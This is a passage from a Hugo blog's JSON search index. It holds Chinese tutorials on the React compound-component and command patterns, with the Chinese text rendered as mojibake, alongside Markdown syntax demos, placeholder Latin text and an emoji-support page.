toggle(!open)}\u0026gt;\r\u0026lt;Icon /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\rfunction List({ children }) {\rconst { open } = useContext(FlyOutContext);\rreturn open \u0026amp;\u0026amp; \u0026lt;ul\u0026gt;{children}\u0026lt;/ul\u0026gt;;\r}\rfunction Item({ children }) {\rreturn \u0026lt;li\u0026gt;{children}\u0026lt;/li\u0026gt;;\r}\rFlyOut.Toggle = Toggle;\rFlyOut.List = List;\rFlyOut.Item = Item; æˆ‘ä»¬ç°åœ¨å¯ä»¥å°†å®ƒä»¬ç”¨ä½œ FlyOut ç»„ä»¶çš„å±æ€§ï¼\nåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¸Œæœ›å‘ç”¨æˆ·æ˜¾ç¤ºä¸¤ä¸ªé€‰é¡¹ï¼šç¼–è¾‘å’Œåˆ é™¤ã€‚\nè®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª FlyOut.List æ¥å‘ˆç°ä¸¤ä¸ª FlyOut.Item ç»„ä»¶ï¼Œä¸€ä¸ªç”¨äºç¼–è¾‘é€‰é¡¹ï¼Œä¸€ä¸ªç”¨äºåˆ é™¤é€‰é¡¹ã€‚\nimport React from \u0026#34;react\u0026#34;;\rimport { FlyOut } from \u0026#34;./FlyOut\u0026#34;;\rexport default function FlyoutMenu() {\rreturn (\r\u0026lt;FlyOut\u0026gt;\r\u0026lt;FlyOut.Toggle /\u0026gt;\r\u0026lt;FlyOut.List\u0026gt;\r\u0026lt;FlyOut.Item\u0026gt;Edit\u0026lt;/FlyOut.Item\u0026gt;\r\u0026lt;FlyOut.Item\u0026gt;Delete\u0026lt;/FlyOut.Item\u0026gt;\r\u0026lt;/FlyOut.List\u0026gt;\r\u0026lt;/FlyOut\u0026gt;\r);\r} Perfectï¼ æˆ‘ä»¬åˆšåˆšåˆ›å»ºäº†ä¸€ä¸ªå®Œæ•´çš„ FlyOut ç»„ä»¶ï¼Œè€Œæ²¡æœ‰åœ¨ FlyOutMenu æœ¬èº«ä¸­æ·»åŠ ä»»ä½•çŠ¶æ€ï¼\nå½“æ‚¨æ„å»ºç»„ä»¶åº“æ—¶ï¼Œå¤åˆæ¨¡å¼éå¸¸æœ‰ç”¨ã€‚ åœ¨ä½¿ç”¨è¯­ä¹‰ UI ç­‰ UI åº“æ—¶ï¼Œæ‚¨ä¼šç»å¸¸çœ‹åˆ°è¿™ç§æ¨¡å¼ã€‚\n\rReact.Children.map æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡æ˜ å°„ç»„ä»¶çš„å­ç»„ä»¶æ¥å®ç°å¤åˆç»„ä»¶æ¨¡å¼ã€‚\næˆ‘ä»¬å¯ä»¥å°† open å’Œ toggle å±æ€§æ·»åŠ åˆ°è¿™äº›å…ƒç´ ä¸­ï¼Œé€šè¿‡ä½¿ç”¨é¢å¤–çš„ props å…‹éš†å®ƒä»¬ã€‚\nexport function FlyOut(props) {\rconst [open, toggle] = React.useState(false);\rreturn (\r\u0026lt;div\u0026gt;\r{React.Children.map(props.children, child =\u0026gt;\rReact.cloneElement(child, { open, toggle })\r)}\r\u0026lt;/div\u0026gt;\r);\r} æ‰€æœ‰å­ç»„ä»¶éƒ½è¢«å…‹éš†ï¼Œå¹¶ä¼ é€’äº† open å’Œ toggle çš„å€¼ã€‚\nä¸å¿…åƒå‰é¢çš„ä¾‹å­é‚£æ ·ä½¿ç”¨ Context APIï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥é€šè¿‡ props è®¿é—®è¿™ä¸¤ä¸ªå€¼ã€‚\n\rä¼˜ç‚¹ å¤åˆç»„ä»¶ç®¡ç†å®ƒä»¬è‡ªå·±çš„å†…éƒ¨çŠ¶æ€ï¼Œå®ƒä»¬åœ¨å‡ ä¸ªå­ç»„ä»¶ä¹‹é—´å…±äº«ã€‚\nåœ¨å®ç°å¤åˆç»„ä»¶æ—¶ï¼Œæˆ‘ä»¬ä¸å¿…æ‹…å¿ƒè‡ªå·±ç®¡ç†çŠ¶æ€ã€‚\nå¯¼å…¥å¤åˆç»„ä»¶æ—¶ï¼Œæˆ‘ä»¬ä¸å¿…æ˜¾å¼å¯¼å…¥è¯¥ç»„ä»¶ä¸Šå¯ç”¨çš„å­ç»„ä»¶ã€‚\nimport { FlyOut } from \u0026#34;./FlyOut\u0026#34;;\rexport default function FlyoutMenu() {\rreturn (\r\u0026lt;FlyOut\u0026gt;\r\u0026lt;FlyOut.Toggle /\u0026gt;\r\u0026lt;FlyOut.List\u0026gt;\r\u0026lt;FlyOut.Item\u0026gt;Edit\u0026lt;/FlyOut.Item\u0026gt;\r\u0026lt;FlyOut.Item\u0026gt;Delete\u0026lt;/FlyOut.Item\u0026gt;\r\u0026lt;/FlyOut.List\u0026gt;\r\u0026lt;/FlyOut\u0026gt;\r);\r} \rç¼ºç‚¹ å½“ä½¿ç”¨ React.Children.map æä¾›å€¼æ—¶ï¼Œç»„ä»¶åµŒå¥—æ˜¯æœ‰é™çš„ã€‚\nåªæœ‰çˆ¶ç»„ä»¶çš„ç›´æ¥å­ç»„ä»¶æ‰èƒ½è®¿é—® open å’Œ toggle é“å…·ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬ä¸èƒ½å°†è¿™äº›ç»„ä»¶ä¸­çš„ä»»ä½•ä¸€ä¸ªåŒ…è£…åœ¨å¦ä¸€ä¸ªç»„ä»¶ä¸­ã€‚\nexport default function FlyoutMenu() {\rreturn (\r\u0026lt;FlyOut\u0026gt;\r{/* This breaks */}\r\u0026lt;div\u0026gt;\r\u0026lt;FlyOut.Toggle /\u0026gt;\r\u0026lt;FlyOut.List\u0026gt;\r\u0026lt;FlyOut.Item\u0026gt;Edit\u0026lt;/FlyOut.Item\u0026gt;\r\u0026lt;FlyOut.Item\u0026gt;Delete\u0026lt;/FlyOut.Item\u0026gt;\r\u0026lt;/FlyOut.List\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/FlyOut\u0026gt;\r);\r} ä½¿ç”¨ React.cloneElement å…‹éš†å…ƒç´ æ‰§è¡Œæµ…åˆå¹¶ã€‚ å·²ç»å­˜åœ¨çš„é“å…·å°†ä¸æˆ‘ä»¬ä¼ é€’çš„æ–°é“å…·åˆå¹¶åœ¨ä¸€èµ·ã€‚\nå¦‚æœå·²ç»å­˜åœ¨çš„ prop ä¸æˆ‘ä»¬ä¼ é€’ç»™ React.cloneElement æ–¹æ³•çš„ props å…·æœ‰ç›¸åŒçš„åç§°ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´å‘½åå†²çªã€‚\nç”±äº props æ˜¯æµ…åˆå¹¶çš„ï¼Œprops çš„å€¼å°†è¢«æˆ‘ä»¬ä¼ é€’çš„æœ€æ–°å€¼è¦†ç›–ã€‚\n\rçŸ¥è¯†ç‚¹  createContext() useContext() Provider React.Children.map()  ","description":"åˆ›å»ºååŒå·¥ä½œä»¥æ‰§è¡Œå•ä¸ªä»»åŠ¡çš„å¤šä¸ªç»„ä»¶","id":134,"section":"react-patterns","tags":null,"title":"å¤åˆæ¨¡å¼","uri":"https://codthing.github.io/react-patterns/design-patterns/compound-pattern/"},{"content":"ä½¿ç”¨å‘½ä»¤æ¨¡å¼ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ‰§è¡Œç‰¹å®šä»»åŠ¡çš„å¯¹è±¡ä¸è°ƒç”¨è¯¥æ–¹æ³•çš„å¯¹è±¡è§£è€¦ã€‚\n\rè®¢å•ç®¡ç†æ¡ˆä¾‹ å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªåœ¨çº¿é£Ÿå“é…é€å¹³å°ã€‚ ç”¨æˆ·å¯ä»¥ä¸‹è®¢å•ã€è·Ÿè¸ªè®¢å•å’Œå–æ¶ˆè®¢å•ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  class OrderManager() { constructor() { this.orders = [] } placeOrder(order, id) { this.orders.push(id) return `æ‚¨å·²æˆåŠŸè®¢è´­ ${order}(${id})`; } trackOrder(id) { return `æ‚¨çš„è®¢å• ${id}å°†åœ¨ 20 åˆ†é’Ÿå†…é€è¾¾ã€‚` } cancelOrder(id) { this.orders = this.orders.filter(order =\u0026gt; order.id !== id) return `æ‚¨å·²å–æ¶ˆè®¢å• ${id}` } }   åœ¨ OrderManager ç±»ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—® placeOrderã€trackOrder å’Œ cancelOrder æ–¹æ³•ã€‚\nconst manager = new OrderManager();\rmanager.placeOrder(\u0026#34;Pad Thai\u0026#34;, \u0026#34;1234\u0026#34;);\rmanager.trackOrder(\u0026#34;1234\u0026#34;);\rmanager.cancelOrder(\u0026#34;1234\u0026#34;); ä½†æ˜¯ï¼Œç›´æ¥åœ¨ç®¡ç†å™¨å®ä¾‹ä¸Šè°ƒç”¨æ–¹æ³•ä¹Ÿæœ‰ç¼ºç‚¹ã€‚\nå¯èƒ½ä¼šå‘ç”Ÿæˆ‘ä»¬å†³å®šç¨åé‡å‘½åæŸäº›æ–¹æ³•ï¼Œæˆ–è€…æ–¹æ³•çš„åŠŸèƒ½å‘ç”Ÿå˜åŒ–çš„æƒ…å†µã€‚\nå‡è®¾æˆ‘ä»¬ç°åœ¨å°†å…¶é‡å‘½åä¸º addOrderï¼Œè€Œä¸æ˜¯å°†å…¶ç§°ä¸º placeOrderï¼ è¿™æ„å‘³ç€æˆ‘ä»¬å¿…é¡»ç¡®ä¿ä¸ä¼šåœ¨ä»£ç åº“çš„ä»»ä½•åœ°æ–¹è°ƒç”¨ placeOrder æ–¹æ³•ï¼Œè¿™åœ¨è¾ƒå¤§çš„åº”ç”¨ç¨‹åºä¸­å¯èƒ½éå¸¸æ£˜æ‰‹ã€‚\nå°†æ–¹æ³•ä¸ç®¡ç†å™¨å¯¹è±¡åˆ†ç¦» \u0026ndash; å‘½ä»¤å‡½æ•° ç›¸åï¼Œæˆ‘ä»¬å¸Œæœ›å°†æ–¹æ³•ä¸ç®¡ç†å™¨å¯¹è±¡åˆ†ç¦»ï¼Œå¹¶ä¸ºæ¯ä¸ªå‘½ä»¤åˆ›å»ºå•ç‹¬çš„å‘½ä»¤å‡½æ•°ï¼\nè®©æˆ‘ä»¬é‡æ„ OrderManager ç±»ï¼šå®ƒæ²¡æœ‰ placeOrderã€cancelOrder å’Œ trackOrder æ–¹æ³•ï¼Œè€Œæ˜¯åªæœ‰ä¸€ä¸ªæ–¹æ³•ï¼šexecuteã€‚ æ­¤æ–¹æ³•å°†æ‰§è¡Œå®ƒç»™å‡ºçš„ä»»ä½•å‘½ä»¤ã€‚\næ¯ä¸ªå‘½ä»¤éƒ½åº”è¯¥å¯ä»¥è®¿é—® OrderManager çš„ ordersï¼Œæˆ‘ä»¬å°†å…¶ä½œä¸ºå®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’ã€‚\n1 2 3 4 5 6 7 8 9 10  class OrderManager { constructor() { this.orders = []; } execute(command, ...args) { return command.execute(this.orders, ...args); } }   æˆ‘ä»¬éœ€è¦ä¸ºè®¢å•ç®¡ç†å™¨åˆ›å»ºä¸‰ä¸ªå‘½ä»¤ï¼š\n PlaceOrderCommand CancelOrderCommand TrackOrderCommand  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  class OrderManager { constructor() { this.orders = []; } execute(command, ...args) { return command.execute(this.orders, ...args); } } class Command { constructor(execute) { this.execute = execute; } } function PlaceOrderCommand(order, id) { return new Command(orders =\u0026gt; { orders.push(id); return `æ‚¨å·²æˆåŠŸè®¢è´­ ${order}(${id})`; }); } function CancelOrderCommand(id) { return new Command(orders =\u0026gt; { orders = orders.filter(order =\u0026gt; order.id !== id); return `æ‚¨å·²å–æ¶ˆè®¢å• ${id}`; }); } function TrackOrderCommand(id) { return new Command(() =\u0026gt; `æ‚¨çš„è®¢å• ${id}å°†åœ¨ 20 åˆ†é’Ÿå†…é€è¾¾ã€‚`); }   \rä¼˜ç‚¹ å‘½ä»¤æ¨¡å¼å…è®¸æˆ‘ä»¬å°†æ–¹æ³•ä¸æ‰§è¡Œæ“ä½œçš„å¯¹è±¡åˆ†ç¦»ã€‚\nå¦‚æœæ‚¨æ­£åœ¨å¤„ç†å…·æœ‰ç‰¹å®šç”Ÿå‘½å‘¨æœŸçš„å‘½ä»¤ï¼Œæˆ–è€…åº”è¯¥åœ¨ç‰¹å®šæ—¶é—´æ’é˜Ÿå’Œæ‰§è¡Œçš„å‘½ä»¤ï¼Œå®ƒä¼šç»™æ‚¨æ›´å¤šçš„æ§åˆ¶æƒã€‚\n\rç¼ºç‚¹ å‘½ä»¤æ¨¡å¼çš„ç”¨ä¾‹éå¸¸æœ‰é™ï¼Œå¹¶ä¸”ç»å¸¸å‘åº”ç”¨ç¨‹åºæ·»åŠ ä¸å¿…è¦çš„æ ·æ¿ã€‚\n\rçŸ¥è¯†ç‚¹  class é€’å½’ Array.prototype.push() Array.prototype.filter()  ","description":"é€šè¿‡å‘æŒ‡æŒ¥å®˜å‘é€å‘½ä»¤æ¥è§£è€¦æ‰§è¡Œä»»åŠ¡çš„æ–¹æ³•","id":135,"section":"react-patterns","tags":null,"title":"å‘½ä»¤æ¨¡å¼","uri":"https://codthing.github.io/react-patterns/design-patterns/command-pattern/"},{"content":"Markdown here\n","description":"test post","id":136,"section":"docs","tags":null,"title":"Related content","uri":"https://codthing.github.io/docs/relatedcontent/"},{"content":"Markdown here\n","description":"test post","id":137,"section":"docs","tags":null,"title":"Page Resources","uri":"https://codthing.github.io/docs/pageresources/"},{"content":"Markdown here\n","description":"test post","id":138,"section":"docs","tags":null,"title":"Page Bundles","uri":"https://codthing.github.io/docs/pagebundles/"},{"content":"Markdown here\n","description":"test post","id":139,"section":"docs","tags":null,"title":"Content Formats","uri":"https://codthing.github.io/docs/contentfortmats/"},{"content":"Markdown here\n","description":"test post","id":140,"section":"docs","tags":null,"title":"Image Processing","uri":"https://codthing.github.io/docs/imageprocessing/"},{"content":"Markdown here\n","description":"test post","id":141,"section":"docs","tags":null,"title":"Shortcodes","uri":"https://codthing.github.io/docs/contentmanagement/shortcodes/"},{"content":"Markdown here\n","description":"test post","id":142,"section":"docs","tags":null,"title":"Frontmatter","uri":"https://codthing.github.io/docs/contentmanagement/frontmatter/"},{"content":"Lorem est tota propiore conpellat pectoribus de\npectora summo. Redit teque digerit hominumque toris verebor lumina non cervice\nsubde tollit usus habet Arctonque, furores quas nec ferunt. Quoque montibus nunc\ncaluere tempus\nThis article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\n\rHeadings The following HTML \u0026lt;h1\u0026gt;â€”\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution  Tiam, ad mint andaepu dandae nostion secatur sequo quae.\nNote that you can use Markdown syntax within a blockquote.\n Blockquote with attribution  Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\nâ€” Rob Pike1\n Tables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\n   Name Age     Bob 27   Alice 23    Inline Markdown within tables    InlineÂ  MarkdownÂ  InÂ  Table     italics bold strikethroughÂ  code    Code Blocks Code block with backticks html\r\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt;\r\u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt;\r\u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\r Code block with Hugo\u0026rsquo;s internal highlight shortcode 1 2 3 4 5 6 7 8 9 10  \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   List Types Ordered List  First item Second item Third item  Unordered List  List item Another item And another item  Nested list  Item  First Sub-item Second Sub-item    Other Elements â€” abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\n The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n  ","description":"","id":143,"section":"blog","tags":["markdown","css","html","themes"],"title":"Markdown Syntax Guide","uri":"https://codthing.github.io/blog/markdown-syntax/"},{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;â€”\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution  Tiam, ad mint andaepu dandae nostion secatur sequo quae.\nNote that you can use Markdown syntax within a blockquote.\n Blockquote with attribution  Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\nâ€” Rob Pike1\n Tables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\n   Name Age     Bob 27   Alice 23    Inline Markdown within tables    InlineÂ  MarkdownÂ  InÂ  Table     italics bold strikethroughÂ  code    Code Blocks Code block with backticks html\r\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt;\r\u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt;\r\u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\r Code block with Hugo\u0026rsquo;s internal highlight shortcode 1 2 3 4 5 6 7 8 9 10  \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   List Types Ordered List  First item Second item Third item  Unordered List  List item Another item And another item  Nested list  Item  First Sub-item Second Sub-item    Other Elements â€” abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\n The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n  ","description":"Sample article showcasing basic Markdown syntax and formatting for HTML elements.","id":144,"section":"docs","tags":["markdown","css","html","themes"],"title":"Section","uri":"https://codthing.github.io/docs/contentmanagement/sections/"},{"content":"Lorem est tota propiore conpellat pectoribus de\npectora summo. Redit teque digerit hominumque toris verebor lumina non cervice\nsubde tollit usus habet Arctonque, furores quas nec ferunt. Quoque montibus nunc\ncaluere tempus\ninhospita parcite confusaque translucet patri vestro qui optatis\nlumine cognoscere flos nubis! Fronde ipsamque patulos Dryopen deorum.\n Exierant elisi ambit vivere dedere Duce pollice Eris modo Spargitque ferrea quos palude  Rursus nulli murmur; hastile inridet ut ab gravi sententia! Nomine potitus\nsilentia flumen, sustinet placuit petis in dilapsa erat sunt. Atria\ntractus malis.\n Comas hunc haec pietate fetum procerum dixit Post torum vates letum Tiresia Flumen querellas Arcanaque montibus omnes Quidem et  Vagus elidunt \nThe Van de Graaf Canon\nMane refeci capiebant unda mulcebat Victa caducifer, malo vulnere contra\ndicere aurato, ludit regale, voca! Retorsit colit est profanae esse virescere\nfurit nec; iaculi matertera et visa est, viribus. Divesque creatis, tecta novat collumque vulnus est, parvas. Faces illo pepulere tempus adest. Tendit flamma, ab opes virum sustinet, sidus sequendo urbis.\nIubar proles corpore raptos vero auctor imperium; sed et huic: manus caeli\nLelegas tu lux. Verbis obstitit intus oblectamina fixis linguisque ausus sperare\nEchionides cornuaque tenent clausit possit. Omnia putatur. Praeteritae refert\nausus; ferebant e primus lora nutat, vici quae mea ipse. Et iter nil spectatae\nvulnus haerentia iuste et exercebat, sui et.\nEurytus Hector, materna ipsumque ut Politen, nec, nate, ignari, vernum cohaesit sequitur. Vel mitis temploque vocatus, inque alis, oculos nomen non silvis corpore coniunx ne displicet illa. Crescunt non unus, vidit visa quantum inmiti flumina mortis facto sic: undique a alios vincula sunt iactata abdita! Suspenderat ego fuit tendit: luna, ante urbem\nPropoetides parte.\n","description":"","id":145,"section":"blog","tags":["markdown","text"],"title":"Placeholder Text","uri":"https://codthing.github.io/blog/placeholder-text/"},{"content":"Lorem est tota propiore conpellat pectoribus de\npectora summo. Redit teque digerit hominumque toris verebor lumina non cervice\nsubde tollit usus habet Arctonque, furores quas nec ferunt. Quoque montibus nunc\ncaluere tempus\nEmoji can be enabled in a Hugo project in a number of ways.\n\rThe emojify function can be called directly in templates or Inline Shortcodes.\nTo enable emoji globally, set enableEmoji to true in your siteâ€™s configuration and then you can type emoji shorthand codes directly in content files; e.g.\nğŸ™ˆ ğŸ™ˆ ğŸ™‰ ğŸ™‰ ğŸ™Š ğŸ™Š\nThe Emoji cheat sheet is a useful reference for emoji shorthand codes.\nN.B. The above steps enable Unicode Standard emoji characters and sequences in Hugo, however the rendering of these glyphs depends on the browser and the platform. To style the emoji you can either use a third party emoji font or a font stack; e.g.\n1 2 3  .emoji { font-family: Apple Color Emoji,Segoe UI Emoji,NotoColorEmoji,Segoe UI Symbol,Android Emoji,EmojiSymbols; }  ","description":"","id":146,"section":"blog","tags":["emoji"],"title":"Emoji Support","uri":"https://codthing.github.io/blog/emoji-support/"}]